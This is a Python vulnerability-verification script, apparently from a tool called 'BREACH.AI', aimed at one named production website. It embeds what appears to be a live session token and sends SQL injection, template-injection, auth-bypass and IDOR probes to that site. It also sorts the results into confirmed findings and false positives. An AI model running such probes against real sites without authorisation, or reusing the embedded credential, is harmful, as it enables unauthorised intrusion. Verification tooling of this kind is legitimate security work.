#!/usr/bin/env python3
"""
BREACH.AI - Finding Verification
================================
Verify suspected vulnerabilities and filter false positives.
"""

import asyncio
import aiohttp
import json
import re
from urllib.parse import quote
from rich.console import Console
from rich.table import Table
from rich import box

console = Console()

SESSION_TOKEN = "eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..jlIxhGVcxuPHbJzw.QE34H3xswQ5tkvUm2MhD6glQOKwNYPByp4xKhHak4vzSkGMUxPuXuDgFlYOOUGMmZSw8kSzXJT-eWDJPbgD4jT-9_SgSMydR1yAYhXk-esS53ycmxLzS6Ic_HYBGQFJGUauVPdHeTX3rlmqQkBj2wKpu8qfPNYU2taVyjhlJD18lFjlpPZB8X0t1BSigjkLVk0YhFh_Tve8DWFGe-eK2sJrNzM0IY3sPz2qkMPZzqm8hlXXLFa-xX-aTsdXjHLfqwCiSqZIl8t79hwWJWsBn8BNu1RblosMW5_Pg0oITTsv_jmO5FhZiQl8cIu1KSrUj0IHi5DWp_EaT50c.F-pVCN1iNzxVl1JpZLwBQA"
TARGET = "https://www.rapidnative.com"


async def verify():
    console.print("[bold cyan]BREACH.AI - FINDING VERIFICATION[/bold cyan]\n")

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:

        # Helper function
        async def get(url, cookies=None):
            try:
                async with session.get(url, cookies=cookies, ssl=False) as resp:
                    return resp.status, await resp.text()
            except Exception as e:
                return 0, str(e)

        verified = []
        false_positives = []

        # =====================================================
        # VERIFY: Auth Bypass on /dashboard and /settings
        # =====================================================
        console.print("[yellow]1. Verifying Auth Bypass on /dashboard and /settings[/yellow]")

        # Get page WITH auth
        status_auth, body_auth = await get(f"{TARGET}/dashboard", {"__session": SESSION_TOKEN})
        # Get page WITHOUT auth
        status_no_auth, body_no_auth = await get(f"{TARGET}/dashboard")

        console.print(f"   /dashboard WITH auth: {status_auth} ({len(body_auth)}b)")
        console.print(f"   /dashboard WITHOUT auth: {status_no_auth} ({len(body_no_auth)}b)")

        # Check if the content is actually different (authenticated content)
        if "Dashboard" in body_no_auth and "Projects" in body_no_auth:
            # Check if user-specific data is shown
            if "user" in body_no_auth.lower() and len(body_auth) == len(body_no_auth):
                console.print(f"   [dim]Result: Next.js returns same shell - checking for user data...[/dim]")

                # Look for actual user-specific content
                # Next.js typically hydrates client-side, so the server-rendered HTML is the same
                if "__NEXT_DATA__" in body_no_auth:
                    # Check the __NEXT_DATA__ for user info
                    next_data_match = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', body_no_auth)
                    if next_data_match:
                        next_data = next_data_match.group(1)
                        try:
                            data = json.loads(next_data)
                            # Check if there's actual user data in the preloaded props
                            if data.get('props', {}).get('pageProps', {}):
                                page_props = data['props']['pageProps']
                                if page_props and 'user' in str(page_props).lower():
                                    console.print(f"   [red]VERIFIED: User data exposed in __NEXT_DATA__[/red]")
                                    verified.append("Auth Bypass - User data in __NEXT_DATA__")
                                else:
                                    console.print(f"   [green]FALSE POSITIVE: No user data in server render[/green]")
                                    false_positives.append("Auth Bypass /dashboard - Next.js shell only")
                        except:
                            pass
                else:
                    console.print(f"   [green]FALSE POSITIVE: Static page shell[/green]")
                    false_positives.append("Auth Bypass /dashboard - Next.js shell")
            else:
                if len(body_no_auth) > 10000:
                    console.print(f"   [green]FALSE POSITIVE: Generic Next.js app shell[/green]")
                    false_positives.append("Auth Bypass /dashboard")
                else:
                    console.print(f"   [red]POSSIBLE: Short response needs review[/red]")
        else:
            console.print(f"   [dim]Page requires auth (different content)[/dim]")
            false_positives.append("Auth Bypass /dashboard")

        # =====================================================
        # VERIFY: SQL Injection
        # =====================================================
        console.print("\n[yellow]2. Verifying SQL Injection findings[/yellow]")

        sqli_tests = [
            ("/api/search", "q"),
            ("/api/users", "email"),
            ("/api/projects", "name"),
        ]

        sqli_errors = ["sql syntax", "mysql", "postgres", "sqlite", "syntax error",
                      "unclosed quotation", "unterminated", "pg_query", "ORA-"]

        for endpoint, param in sqli_tests:
            console.print(f"\n   Testing {endpoint}?{param}=...")

            # Baseline request
            status_base, body_base = await get(f"{TARGET}{endpoint}?{param}=normalvalue")

            # SQLi payload
            payload = "' OR '1'='1"
            status_sqli, body_sqli = await get(f"{TARGET}{endpoint}?{param}={quote(payload)}")

            console.print(f"   Baseline: {status_base} ({len(body_base)}b)")
            console.print(f"   SQLi payload: {status_sqli} ({len(body_sqli)}b)")

            # Check for actual SQL error
            body_lower = body_sqli.lower()
            found_errors = [e for e in sqli_errors if e in body_lower]

            if found_errors:
                # Make sure it's not just the word appearing in minified JS
                # Real SQL errors have specific patterns
                real_error_patterns = [
                    r"error.*sql",
                    r"sql.*error",
                    r"You have an error in your SQL syntax",
                    r"Warning.*mysql",
                    r"PostgreSQL.*ERROR",
                    r"ORA-\d+",
                ]
                is_real = any(re.search(p, body_sqli, re.I) for p in real_error_patterns)

                if is_real:
                    console.print(f"   [red]VERIFIED: SQL error detected: {found_errors}[/red]")
                    verified.append(f"SQLi - {endpoint}?{param}")
                else:
                    console.print(f"   [green]FALSE POSITIVE: Keyword in minified JS, not SQL error[/green]")
                    false_positives.append(f"SQLi - {endpoint}?{param}")
            else:
                # Check if responses are identical (Next.js catch-all)
                if abs(len(body_base) - len(body_sqli)) < 100:
                    console.print(f"   [green]FALSE POSITIVE: Same response (Next.js catch-all)[/green]")
                    false_positives.append(f"SQLi - {endpoint}?{param}")
                else:
                    console.print(f"   [yellow]NEEDS REVIEW: Different response sizes[/yellow]")

        # =====================================================
        # VERIFY: SSTI (Server-Side Template Injection)
        # =====================================================
        console.print("\n[yellow]3. Verifying SSTI findings[/yellow]")

        ssti_tests = [
            ("/api/search", "q"),
            ("/api/users", "email"),
        ]

        for endpoint, param in ssti_tests:
            console.print(f"\n   Testing {endpoint}?{param}=...")

            # Baseline
            status_base, body_base = await get(f"{TARGET}{endpoint}?{param}=normalvalue")

            # SSTI payloads
            payloads = [
                ("{{7*7}}", "49"),
                ("${7*7}", "49"),
                ("{{7*'7'}}", "7777777"),
            ]

            for payload, expected in payloads:
                status_ssti, body_ssti = await get(f"{TARGET}{endpoint}?{param}={quote(payload)}")

                # Check if expected result appears AND payload doesn't
                # (if payload is reflected, it's just echoing, not evaluating)
                if expected in body_ssti:
                    # Check it's not just in minified JS or HTML that already has the number
                    if expected in body_base:
                        console.print(f"   [green]FALSE POSITIVE: '{expected}' already in base response[/green]")
                        false_positives.append(f"SSTI - {endpoint}?{param}")
                        break
                    elif payload not in body_ssti:
                        console.print(f"   [red]VERIFIED: SSTI - payload evaluated to {expected}[/red]")
                        verified.append(f"SSTI - {endpoint}?{param}")
                        break
                    else:
                        console.print(f"   [green]FALSE POSITIVE: Payload reflected, not evaluated[/green]")
                        false_positives.append(f"SSTI - {endpoint}?{param}")
                        break
            else:
                # Check if "49" was in base (likely in JS)
                if "49" in body_base:
                    console.print(f"   [green]FALSE POSITIVE: '49' exists in base page (likely CSS/JS)[/green]")
                    false_positives.append(f"SSTI - {endpoint}?{param}")

        # =====================================================
        # VERIFY: Sensitive File Exposure
        # =====================================================
        console.print("\n[yellow]4. Verifying sensitive file exposure[/yellow]")

        status, body = await get(f"{TARGET}/test.php")
        console.print(f"   /test.php: {status} ({len(body)}b)")

        if status == 200:
            # Check if it's actually PHP output or just the Next.js catch-all
            if "<?php" in body or "phpinfo" in body.lower():
                console.print(f"   [red]VERIFIED: PHP file accessible[/red]")
                verified.append("Exposed /test.php")
            elif "<!DOCTYPE html>" in body and "__NEXT_DATA__" in body:
                console.print(f"   [green]FALSE POSITIVE: Next.js catch-all route[/green]")
                false_positives.append("Exposed /test.php")
            else:
                console.print(f"   [yellow]NEEDS REVIEW[/yellow]")

        # =====================================================
        # ADDITIONAL DEEP TESTS
        # =====================================================
        console.print("\n[yellow]5. Additional verified tests[/yellow]")

        # Test actual API endpoints with auth
        console.print("\n   Testing authenticated API endpoints...")

        api_endpoints = [
            "/api/projects",
            "/api/user",
            "/api/me",
            "/api/settings",
            "/api/billing",
            "/api/team",
        ]

        cookies = {"__session": SESSION_TOKEN}

        for ep in api_endpoints:
            # With auth
            status_auth, body_auth = await get(f"{TARGET}{ep}", cookies)
            # Without auth
            status_no_auth, body_no_auth = await get(f"{TARGET}{ep}")

            console.print(f"   {ep}: auth={status_auth} noauth={status_no_auth}")

            if status_auth == 200 and status_no_auth == 200:
                # Both return 200 - check if data is same
                if body_auth == body_no_auth and len(body_auth) > 100:
                    # Check if it's actual JSON data or HTML
                    try:
                        data = json.loads(body_auth)
                        if data:
                            console.print(f"   [red]VERIFIED: {ep} returns data without auth[/red]")
                            verified.append(f"Unauth API Access - {ep}")
                    except:
                        console.print(f"   [dim]HTML response (Next.js catch-all)[/dim]")

        # Test for actual IDOR with project IDs from public pages
        console.print("\n   Testing IDOR with public project IDs...")

        public_ids = [
            "hBZ4Zw7qoidiBhB6Ka3Zr",
            "O3EykphxeNyD8amsRDNfm",
            "7-NPhIgLQsHibT9N1sjj6",
        ]

        for pid in public_ids:
            # Try to access as another user (no auth)
            status, body = await get(f"{TARGET}/api/project/{pid}")
            console.print(f"   /api/project/{pid}: {status} ({len(body)}b)")

            if status == 200:
                try:
                    data = json.loads(body)
                    if data and 'user' not in str(data).lower()[:100]:
                        console.print(f"   [yellow]Project data accessible[/yellow]")
                except:
                    pass

        # =====================================================
        # FINAL REPORT
        # =====================================================
        console.print("\n" + "="*70)
        console.print("[bold]VERIFICATION COMPLETE[/bold]")
        console.print("="*70 + "\n")

        t = Table(box=box.ROUNDED, title="Verification Results")
        t.add_column("Category", style="cyan")
        t.add_column("Count")
        t.add_row("Verified Vulnerabilities", f"[red]{len(verified)}[/red]")
        t.add_row("False Positives Filtered", f"[green]{len(false_positives)}[/green]")
        console.print(t)

        if verified:
            console.print("\n[bold red]VERIFIED VULNERABILITIES:[/bold red]")
            for v in verified:
                console.print(f"  [red]! {v}[/red]")
        else:
            console.print("\n[bold green]No verified vulnerabilities found.[/bold green]")
            console.print("[dim]All initial findings were false positives (Next.js catch-all routes)[/dim]")

        if false_positives:
            console.print(f"\n[dim]Filtered {len(false_positives)} false positives[/dim]")

        console.print("\n" + "="*70 + "\n")


if __name__ == "__main__":
    asyncio.run(verify())
